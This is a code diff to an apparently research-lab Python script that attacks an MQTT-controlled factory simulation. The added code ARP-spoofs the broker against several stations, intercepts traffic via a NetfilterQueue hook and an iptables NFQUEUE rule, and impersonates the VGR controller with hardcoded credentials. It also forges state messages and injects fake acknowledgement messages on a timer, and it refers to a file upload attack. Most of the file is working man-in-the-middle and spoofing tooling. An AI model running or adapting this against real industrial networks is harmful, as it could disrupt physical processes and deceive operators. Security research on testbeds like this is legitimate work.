@@ -1,11 +1,17 @@
 import time
 import threading
+import netfilterqueue
 from datetime import timezone, datetime
 import logging
 import json
 import subprocess
+import socket
 
+import paho.mqtt.client
 import paho.mqtt.client as mqtt
+import scapy.all as scapy
+import scratch_2
+import globs
 
 from paramiko import SSHClient
 from paramiko.client import AutoAddPolicy
@@ -20,6 +26,13 @@ dst_ip = "192.168.0.10"
 dst_port = 1883
 
 order_color = None
+
+
+def broker():
+    ss = netfilterqueue.NetfilterQueue()
+    ss.bind(22, scratch_2.packet_process)
+    ss.run()
+
 
 def second_attack():
     logger.info("Starting file upload attack on 192.168.0.13")
@@ -193,17 +206,42 @@ def on_publish(client, userdata, msgid, *rest):
         case 33:
             # wait for an ORDER event to trigger from the local broker (see the on_message() function for more)
             # while waiting, we just keep sending VGR state information
-            client.user_data_set(-1)  # where -1 is just user defined so that the case will always default to `case -1`
+              # where -1 is just user defined so that the case will always default to `case -1`
             # (where nothing will happen) until user_data_set is used in the on_message() function
             logger.info("Listening for order")
+
+            # -----------------------
+            # we just publish something to take us to the case -1
+            data = state(0, 1, "", "hbw")
+            client.publish("f/i/state/hbw", data, qos=1)
+            # -----------------------
+            globs.send_state_every_10_seconds_trigger = True
+
+            ## ----------------------
+            data = state(0, 1, "", "mpo")
+            client.publish("f/i/state/mpo", data, qos=1)
+            ## ----------------------
+
+            ### ----------------------
+            data = state(0, 1, "", "sld")
+            client.publish("f/i/state/sld", data, qos=1)
+            ### ----------------------
+
+            client.user_data_set(-1)
 
         case 34:
             data = '{\n\t"code" : 3,\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
-
             client.publish("fl/vgr/do", data, qos=1)
+
+            # ------------------
+            data = state(1, 2, "", "hbw")
+            client.publish("f/i/state/hbw", data, qos=1)
+            # ------------------
+
             print("34 fl/vgr/do")
             client.user_data_set(client.user_data_get() + 1)
+
             threads_list[thread_counter].start()
             # time.sleep(50)
 
@@ -225,7 +263,7 @@ def on_publish(client, userdata, msgid, *rest):
                 
             data = state(0, 1, "", "vgr", "hbw")
             client.publish("f/i/state/vgr", data, qos=1)
-            print("44 /state/vgr")
+
             client.user_data_set(client.user_data_get() + 1)
 
     # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
@@ -233,10 +271,13 @@ def on_publish(client, userdata, msgid, *rest):
             if msgid_sim == 37:
                 time.sleep(2)
             if msgid_sim == 43:
-                client.user_data_set(-1)  # where -1 is just user defined so that the case will always default to `case -1`
-                # (where nothing will happen) until user_data_set is used in the on_message() function
+                logger.info("Waiting for hbw/ack")
+                # ------------------
+                data = state(0, 1, "", "hbw")
+                client.publish("f/i/state/hbw", data, qos=1)
+                # ------------------
+                client.user_data_set(-1)
 
-            #     time.sleep(3.5)
             if msgid_sim == 45:
                 time.sleep(2)
 
@@ -244,11 +285,21 @@ def on_publish(client, userdata, msgid, *rest):
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
+
         case 49:
             data = '{\n\t"code" : 4,\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
             client.publish("fl/vgr/do", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
+
+            # ----------------
+            data = state(1, 2, "", "hbw")
+            client.publish("f/i/state/hbw", data, qos=1)
+            # ----------------
+
+        case 60:
+            logger.info("Waiting for mpo/ack code 1")
+            client.user_data_set(-1)
 
         # case block to handle bulk cases where active, code, target is 0,1,mpo respectively
         case 50 | 53 | 55 | 56 | 64 | 65 | 70 | 71 | 72 | 73 | 74:
@@ -260,14 +311,27 @@ def on_publish(client, userdata, msgid, *rest):
                 time.sleep(5.5)
             if msgid_sim == 70:
                 time.sleep(2.8)
-            if msgid_sim in [71, 72, 73, 74]:
+            if msgid_sim == 71:
+                time.sleep(2)
+
+                # -----------------------
+                data = state(0, 1, "", "hbw")
+                client.publish("f/i/state/hbw", data, qos=1)
+                # -----------------------
+
+                time.sleep(8)
+
+            if msgid_sim in [72, 73, 74]:
                 time.sleep(10)
-            if msgid_sim == 75:
-                client.user_data_set(-1)
+
 
             data = state(0, 1, "", "vgr", "mpo")
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
+
+        case 75:
+            logger.info("Waiting for mpo/ack code 2")
+            client.user_data_set(-1)
 
         # case block to handle bulk cases where active, code, target is 1,2,mpo respectively
         case 51 | 52 | 54 | 59 | 63:
@@ -288,10 +352,12 @@ def on_publish(client, userdata, msgid, *rest):
             client.publish("fl/vgr/do", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
+        case 76:
+            logger.info("Waiting for sld/ack")
+            client.user_data_set(-1)
+
         # case block to handle bulk cases where active, code, target is 0,1,dso respectively
-        case 76 | 78 | 80 | 84 | 86 | 87 | 92 | 94 | 96 | 102 | 106 | 107:
-            # if msgid_sim == 76:
-            #     client.user_data_set(-1)
+        case 78 | 80 | 84 | 86 | 87 | 92 | 94 | 96 | 102 | 106 | 107:
             if msgid_sim == 78:
                 time.sleep(3.3)
             if msgid_sim == 92:
@@ -309,7 +375,7 @@ def on_publish(client, userdata, msgid, *rest):
             client.user_data_set(client.user_data_get() + 1)
 
         # case block to handle bulk cases where active, code, target is 1,2,dso respectively
-        case 77 | 79 | 83 | 85 | 91 | 95 | 105:
+        case 77 | 79 | 83 | 85 | 91 | 93 | 95 | 105:
             data = state(1, 2, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
@@ -339,19 +405,14 @@ def on_publish(client, userdata, msgid, *rest):
         case -1:
             pass
 
-        # case to send f/i/state/vgr information every 10 seconds when there is no process/order to fufill in FL
-        case _:
-            time.sleep(10)
-            data = state(0, 1, "", "vgr", "hbw")
-            client.publish("f/i/state/vgr", data, qos=1)
-            client.user_data_set(client.user_data_get() + 1)
-
 
 def on_message(client, userdata, mqttmsg):
     global order_color
     mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
 
     if mqttmsg.topic == "f/o/order":
+        globs.on_message_event_trigger = True
+        thread_counter_for_on_message_trigger.start()
         logger.info("Order received from Dashboard via broker")
 
         order_color = mqttpayload['type']
@@ -368,28 +429,138 @@ def on_message(client, userdata, mqttmsg):
         client.user_data_set(44)
         print("HBW ack")
 
+    if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 1:
+        data = state(0, 1, "", "vgr", "mpo")
+        client.publish("f/i/state/vgr", data, qos=1)
+
+        ## ----------------------
+        data = state(1, 2, "", "mpo")
+        client.publish("f/i/state/mpo", data, qos=1)
+        ## ----------------------
+
+        client.user_data_set(61)
+        print("mpo/ack code 1")
+
     if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 2:
         data = state(0, 1, "", "vgr", "mpo")
         client.publish("f/i/state/vgr", data, qos=1)
+
+        ## ----------------------
+        data = state(0, 1, "", "mpo")
+        client.publish("f/i/state/mpo", data, qos=1)
+        ## ----------------------
+
+        ### ----------------------
+        data = state(1, 2, "", "sld")
+        client.publish("f/i/state/sld", data, qos=1)
+        ### ----------------------
+
+
         client.user_data_set(76)
-        print("mpo/ack")
+        print("mpo/ack code 2")
 
-    # if mqttmsg.topic == "fl/sld/ack" and mqttpayload["code"] == 2:
-    #     data = state(0, 1, "", "vgr", "dso")
-    #     client.publish("f/i/state/vgr", data, qos=1)
-    #     client.user_data_set(77)
+    if mqttmsg.topic == "fl/sld/ack" and mqttpayload["code"] == 2:
+        data = state(0, 1, "", "vgr", "dso")
+        client.publish("f/i/state/vgr", data, qos=1)
+
+        ### ----------------------
+        data = state(0, 1, "", "sld")
+        client.publish("f/i/state/sld", data, qos=1)
+        ### ----------------------
+
+        client.user_data_set(77)
+        print("fl/sld/ack ")
 
 
-# set IP tables queue as drop
-# ss = subprocess.getoutput('iptables -P FORWARD DROP')  # haven't tried iptables drop in-code, but this code worked fine when I manually set iptables as DROP
+def publish_state_10_seconds():
+    while globs.send_state_every_10_seconds_trigger is not True:
+        continue
+
+    while globs.send_state_every_10_seconds_trigger is True:
+        data = state(0, 1, "", "vgr", "hbw")
+        mqtt_connect.publish("f/i/state/vgr", data, qos=1)
+        time.sleep(6.6)
+
+        # -----------------------
+        data = state(0, 1, "", "hbw")
+        mqtt_connect.publish("f/i/state/hbw", data, qos=1)
+
+        while globs.hbw_stock is None:
+            continue
+        data = globs.hbw_stock
+        print("hbw_stock", globs.hbw_stock)
+        mqtt_connect.publish("f/i/stock", data, qos=1)
+        # -----------------------
+        time.sleep(3.3)
+
+
+# template is {"workpiece location": ["hbw/ack", "mpo/ack code 1", "mpo/ack code 2", "sld/ack"]}
+dict_ = {"C1": [27, 49, 95, 104],  }  #26.8, 49.3, 95.2, 104
+
+
+def counter_for_on_message_trigger():
+    program_start_time = int("{:.0f}".format(time.perf_counter()))
+
+    while globs.on_message_event_trigger is True:
+        check = int("{:.0f}".format(time.perf_counter()))
+
+        if check - program_start_time == dict_["C1"][3]:
+            # trigger fl/sld/ack
+            print("trigger fl/sld/ack ")
+            oops = paho.mqtt.client.MQTTMessage(0, b"fl/sld/ack")
+            oops.payload = b'{"code": 2}'
+            on_message(mqtt_connect, None, oops)
+            logger.info("Sim: fl/sld/ack message received")
+            globs.on_message_event_trigger = False
+
+        elif check - program_start_time == dict_["C1"][2]:
+            # trigger fl/mpo/ack, code 2
+            print("trigger fl/mpo/ack 2")
+            oops = paho.mqtt.client.MQTTMessage(0, b"fl/mpo/ack")
+            oops.payload = b'{"code": 2}'
+            on_message(mqtt_connect, None, oops)
+            logger.info("Sim: fl/mpo/ack with code=2 message received")
+
+        elif check - program_start_time == dict_["C1"][1]:
+            # trigger fl/mpo/ack, code 1
+            print("trigger fl/mpo/ack 1")
+            oops = paho.mqtt.client.MQTTMessage(0, b"fl/mpo/ack")
+            oops.payload = b'{"code": 1}'
+            on_message(mqtt_connect, None, oops)
+            logger.info("Sim: fl/mpo/ack with code=1 message received")
+
+        elif check - program_start_time == dict_["C1"][0]:
+            # trigger fl/hbw/ack
+            print("trigger fl/hbw/ack 1")
+            oops = paho.mqtt.client.MQTTMessage(0, b"fl/hbw/ack")
+            oops.payload = b'{"code": 1}'
+            on_message(mqtt_connect, None, oops)
+            logger.info("Sim: fl/hbw/ack message received")
+
+        time.sleep(1)
+
+
+# set IP tables to queue packets
+# ss = subprocess.getoutput('iptables -I FORWARD -j NFQUEUE --queue-num 22 -4 -p tcp --dport 1883')
 
 # send 1 arp spoof packet to poison broker arp cache
-ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.13 -t 192.168.0.10')
+ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.13')
+ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.12')  #hbw
+ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.11')  #mpo
+ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.14')  #sld
 logging.info("Successfully spoofed VGR with just 1 arp packet")
+
+thread_sniffer = threading.Thread(target=broker)
+thread_sniffer.start()
+
+thread_counter_for_on_message_trigger = threading.Thread(target=counter_for_on_message_trigger)
+
+
 
 mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
 mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without username/password
 mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=120)
+mqtt_connect.socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
 
 
 mqtt_connect.on_connect = on_connect
@@ -397,9 +568,11 @@ mqtt_connect.on_subscribe = on_subscribe
 mqtt_connect.on_publish = on_publish
 mqtt_connect.on_message = on_message
 
+thread_send_state_every_10_seconds = threading.Thread(target=publish_state_10_seconds)
+thread_send_state_every_10_seconds.start()
+
 
 mqtt_connect.loop_forever()
-
 
 
 # POINTS:
